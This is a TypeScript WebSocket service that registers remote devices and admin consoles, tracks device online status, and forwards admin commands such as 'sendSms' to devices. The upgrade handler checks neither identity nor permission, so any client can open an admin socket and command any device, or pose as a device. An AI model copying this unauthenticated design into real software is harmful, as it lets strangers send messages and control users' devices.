// server/services/wsService.ts
import http from "http";
import url from "url";
import WebSocket, { WebSocketServer } from "ws";
import logger from "../logger/logger";
import config from "../config";
import Device from "../models/Device";

type WsPayload = Record<string, any>;

class WsService {
  private wss: WebSocketServer | null = null;

  // device sockets keyed by deviceId
  private clients: Map<string, Set<WebSocket>> = new Map();

  // admin sockets keyed by:
  // - "__ADMIN__" for global admin connections (connected to /ws/admin)
  // - "admin" for legacy path (if used)
  // - "<deviceId>" for per-device admin connections (connected to /ws/admin/:deviceId)
  private adminConnections: Map<string, Set<WebSocket>> = new Map();

  // ✅ Track "primary/latest" device socket to avoid broadcast duplicates
  private primaryDeviceSocket: Map<string, WebSocket> = new Map();
  private socketConnectedAt: WeakMap<WebSocket, number> = new WeakMap();

  // ✅ Dedupe sendSms by clientMsgId (TTL)
  private sendSmsDedupe: Map<string, number> = new Map(); // clientMsgId -> expiresAt

  init(server: http.Server, wsBasePath = config.wsPath) {
    if (this.wss) {
      logger.warn("wsService.init already called");
      return;
    }

    this.wss = new WebSocketServer({
      noServer: true,
      maxPayload: 25 * 1024 * 1024,
    });

    server.on("upgrade", (req, socket, head) => {
      try {
        const parsed = url.parse(req.url || "");
        const pathname = parsed.pathname || "";

        const prefix = wsBasePath.endsWith("/") ? wsBasePath.slice(0, -1) : wsBasePath;

        // support both device and admin sockets
        const isDeviceSocket = pathname.startsWith(`${prefix}/devices/`);
        const isAdminSocket = pathname.startsWith(`${prefix}/admin`);

        if (!isDeviceSocket && !isAdminSocket) {
          socket.destroy();
          return;
        }

        // determine id: admin sockets get either global key "__ADMIN__"
        // or a per-device id (the target deviceId). Device sockets use the last path segment.
        let deviceId = "";
        if (isAdminSocket) {
          // support both /ws/admin and /ws/admin/<deviceId>
          const parts = pathname.split("/").filter(Boolean);
          const adminIndex = parts.findIndex((p) => p === "admin");
          const maybeTarget = adminIndex >= 0 && parts.length > adminIndex + 1 ? parts[adminIndex + 1] : null;

          if (maybeTarget) {
            deviceId = String(maybeTarget);
          } else {
            deviceId = "__ADMIN__";
          }
        } else {
          const parts = pathname.split("/");
          deviceId = parts[parts.length - 1];
        }

        if (!deviceId) {
          socket.destroy();
          return;
        }

        const socketType = isDeviceSocket ? "device" : "admin";

        this.wss!.handleUpgrade(req, socket as any, head, (ws) => {
          this.wss!.emit("connection", ws, req, deviceId, socketType);
        });
      } catch (err) {
        logger.error("wsService upgrade error", err);
        try {
          socket.destroy();
        } catch {}
      }
    });

    this.wss.on("connection", async (ws: WebSocket, _req: any, deviceId: string, socketType: string) => {
      try {
        if (socketType === "device") {
          await this.registerClient(deviceId, ws);
        } else {
          await this.registerAdminClient(deviceId, ws);
        }

        this.setupListeners(deviceId, ws, socketType);

        logger.info("wsService: client connected", {
          deviceId,
          socketType,
        });
      } catch (err) {
        logger.error("wsService connection handler error", err);
        try {
          ws.close();
        } catch {}
      }
    });

    logger.info("wsService: initialized");
  }

  private cleanupSendSmsDedupe() {
    const now = Date.now();
    // keep it tiny (bounded by recent sends)
    for (const [k, exp] of this.sendSmsDedupe.entries()) {
      if (exp <= now) this.sendSmsDedupe.delete(k);
    }
  }

  private isDuplicateSendSms(clientMsgId: string): boolean {
    if (!clientMsgId) return false;
    this.cleanupSendSmsDedupe();

    const now = Date.now();
    const exp = this.sendSmsDedupe.get(clientMsgId);
    if (exp && exp > now) return true;

    this.sendSmsDedupe.set(clientMsgId, now + 60_000); // 60s TTL
    return false;
  }

  // registerClient: track sockets and (optionally) mark device online only for real devices
  private async registerClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId) || new Set<WebSocket>();
    set.add(ws);
    this.clients.set(deviceId, set);

    // ✅ mark socket connect time + make it primary (latest wins)
    this.socketConnectedAt.set(ws, Date.now());
    this.primaryDeviceSocket.set(deviceId, ws);

    // Mark ONLINE only for non-admin device ids
    if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
      try {
        await Device.findOneAndUpdate(
          { deviceId },
          {
            $set: {
              "status.online": true,
              "status.timestamp": Date.now(),
            },
          },
          { upsert: true }
        );

        logger.info("Device marked ONLINE (ws connect)", { deviceId });
      } catch (e) {
        logger.error("Failed marking online on registerClient", e);
      }
    }

    ws.once("close", () => this.unregisterClient(deviceId, ws));
    ws.once("error", () => this.unregisterClient(deviceId, ws));
  }

  private async registerAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key) || new Set<WebSocket>();
    set.add(ws);
    this.adminConnections.set(key, set);

    logger.info("Admin connected", { key, total: (set && set.size) || 0 });

    ws.once("close", () => this.unregisterAdminClient(key, ws));
    ws.once("error", () => this.unregisterAdminClient(key, ws));
  }

  // DISCONNECT = OFFLINE (INSTANT) for device sockets
  private async unregisterClient(deviceId: string, ws: WebSocket) {
    const set = this.clients.get(deviceId);
    if (!set) return;

    set.delete(ws);

    // ✅ if this ws was primary, choose another newest remaining as primary
    if (this.primaryDeviceSocket.get(deviceId) === ws) {
      if (set.size > 0) {
        let best: WebSocket | null = null;
        let bestTs = -1;
        for (const s of set) {
          const ts = this.socketConnectedAt.get(s) ?? 0;
          if (ts > bestTs) {
            bestTs = ts;
            best = s;
          }
        }
        if (best) this.primaryDeviceSocket.set(deviceId, best);
      } else {
        this.primaryDeviceSocket.delete(deviceId);
      }
    }

    // if others remain, keep status
    if (set.size > 0) {
      logger.info("wsService: device socket removed but other connections exist", {
        deviceId,
        remaining: set.size,
      });
      return;
    }

    // fully disconnected
    this.clients.delete(deviceId);

    // Only mark offline for real devices (don't mark admin channels)
    if (!deviceId.startsWith("__ADMIN__") && deviceId !== "admin") {
      try {
        await Device.findOneAndUpdate(
          { deviceId },
          {
            $set: {
              "status.online": false,
              "status.timestamp": Date.now(),
            },
          }
        );

        logger.info("🔥 Device marked OFFLINE (instant ws disconnect)", {
          deviceId,
        });
      } catch (e) {
        logger.error("Failed marking offline", e);
      }

      // broadcast offline to admins
      this.notifyDeviceStatus(deviceId, {
        online: false,
        timestamp: Date.now(),
      });
    }

    logger.info("wsService: device client disconnected", { deviceId });
  }

  private unregisterAdminClient(key: string, ws: WebSocket) {
    const set = this.adminConnections.get(key);
    if (!set) return;

    set.delete(ws);

    if (set.size > 0) {
      logger.info("wsService: admin socket removed but others exist", {
        key,
        remaining: set.size,
      });
      return;
    }

    this.adminConnections.delete(key);
    logger.info("wsService: admin client disconnected", { key });
  }

  private setupListeners(deviceId: string, ws: WebSocket, socketType: string) {
    ws.on("message", async (data: WebSocket.RawData) => {
      const text = data.toString();
      logger.debug("wsService message", { deviceId, text, socketType });

      try {
        const obj: WsPayload = JSON.parse(text);
        const type = obj.type;

        // PING
        if (type === "ping") {
          ws.send(JSON.stringify({ type: "ack", timestamp: Date.now() }));
          return;
        }

        // STATUS UPDATE (HEARTBEAT BASED)
        if (type === "status" && socketType === "device") {
          const online = !!obj.online;
          const ts = Number(obj.timestamp || Date.now());

          await Device.findOneAndUpdate(
            { deviceId },
            {
              $set: {
                "status.online": online,
                "status.timestamp": ts,
              },
            },
            { upsert: true }
          );

          logger.info("wsService: status updated", {
            deviceId,
            online,
          });

          this.notifyDeviceStatus(deviceId, {
            online,
            timestamp: ts,
          });

          return;
        }

        // CMD FORWARD
        if (type === "cmd") {
          let adminTargetFromUrl: string | null = null;
          if (socketType === "admin" && deviceId !== "__ADMIN__") {
            adminTargetFromUrl = deviceId;
          }

          const targetDeviceId = obj.payload?.uniqueid || obj.payload?.deviceId || adminTargetFromUrl || deviceId;

          const forwarded = this.sendCommandToDevice(targetDeviceId, obj.name || "", obj.payload || {});

          logger.info("wsService: cmd forwarded", {
            from: deviceId,
            to: targetDeviceId,
            name: obj.name,
            delivered: forwarded,
          });

          return;
        }
      } catch (err: any) {
        logger.warn("wsService: invalid ws message", err?.message);
      }
    });

    ws.on("error", (err) => {
      logger.warn("wsService ws error", {
        deviceId,
        err: err.message,
      });
    });

    // ACK back to the socket (for both device and admin)
    const ackPayload = {
      type: "ack",
      message: socketType === "device" ? "device connected" : "admin connected",
      deviceId,
      timestamp: Date.now(),
    };
    try {
      ws.send(JSON.stringify(ackPayload));
    } catch {
      // ignore
    }
  }

  private sendRaw(ws: WebSocket, text: string) {
    try {
      ws.send(text);
    } catch (err: any) {
      logger.warn("wsService send error", err?.message);
    }
  }

  // Broadcast to all device sockets (keep for events/status; OK to broadcast)
  sendToDevice(deviceId: string, payload: WsPayload) {
    const set = this.clients.get(deviceId);
    if (!set || set.size === 0) return false;

    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);

    return true;
  }

  // ✅ Send to ONE device socket (primary)
  private sendToDevicePrimary(deviceId: string, payload: WsPayload) {
    const ws = this.primaryDeviceSocket.get(deviceId);
    if (!ws) return false;

    const text = JSON.stringify(payload);
    this.sendRaw(ws, text);
    return true;
  }

  sendCommandToDevice(deviceId: string, name: string, payload: WsPayload = {}) {
    const normalized =
      typeof deviceId === "string" && deviceId.startsWith("__ADMIN__:") ? deviceId.split(":", 2)[1] : deviceId;

    // ✅ Special-case sendSms: single socket + dedupe by clientMsgId
    if (name === "sendSms") {
      const clientMsgId = String(payload?.clientMsgId || "").trim();
      if (clientMsgId && this.isDuplicateSendSms(clientMsgId)) {
        logger.warn("wsService: sendSms dropped (duplicate clientMsgId)", {
          deviceId: normalized,
          clientMsgId,
        });
        return true; // treat as delivered to stop UI retries
      }

      const delivered = this.sendToDevicePrimary(normalized, {
        type: "cmd",
        name,
        payload,
      });

      logger.info("wsService: sendSms forwarded (primary only)", {
        deviceId: normalized,
        delivered,
        clientMsgId: clientMsgId || undefined,
      });

      return delivered;
    }

    // default commands: keep broadcast (some commands may expect all sockets)
    return this.sendToDevice(normalized, {
      type: "cmd",
      name,
      payload,
    });
  }

  // ---- Admin helpers ----

  private sendToAdminKey(key: string, payload: WsPayload) {
    const set = this.adminConnections.get(key);
    if (!set || set.size === 0) return false;

    const text = JSON.stringify(payload);
    for (const ws of set) this.sendRaw(ws, text);
    return true;
  }

  async sendToAdminDevice(deviceId: string, payload: WsPayload) {
    const sentPerDevice = this.sendToAdminKey(deviceId, payload);
    const sentGlobal = this.sendToAdminKey("__ADMIN__", payload);
    const sentLegacy = this.sendToAdminKey("admin", payload);

    return sentPerDevice || sentGlobal || sentLegacy;
  }

  broadcastGlobalAdminUpdate(phone: string): boolean {
    const payload = {
      type: "event",
      event: "globalAdmin.update",
      data: {
        phone,
        timestamp: Date.now(),
      },
    };

    const sentGlobal = this.sendToAdminKey("__ADMIN__", payload);
    const sentLegacy = this.sendToAdminKey("admin", payload);

    logger.info("wsService: global admin update broadcasted", { phone, sentGlobal, sentLegacy });

    return !!(sentGlobal || sentLegacy);
  }

  notifyDeviceStatus(deviceId: string, status: { online: boolean; timestamp?: number }) {
    const payload = {
      type: "event",
      event: "status",
      deviceId,
      data: status,
    };

    // send to device sockets (if any)
    this.sendToDevice(deviceId, payload);

    // admin channels
    this.sendToAdminKey("__ADMIN__", payload);
    this.sendToAdminKey("admin", payload);
    this.sendToAdminKey(deviceId, payload);

    return true;
  }

  async shutdown() {
    for (const set of this.clients.values()) {
      for (const ws of set) {
        try {
          ws.close();
        } catch {}
      }
    }
    this.clients.clear();
    this.primaryDeviceSocket.clear();

    for (const set of this.adminConnections.values()) {
      for (const ws of set) {
        try {
          ws.close();
        } catch {}
      }
    }
    this.adminConnections.clear();

    if (this.wss) {
      try {
        this.wss.close();
      } catch {}
      this.wss = null;
    }

    logger.info("wsService: shutdown complete");
  }
}

const wsService = new WsService();
export default wsService;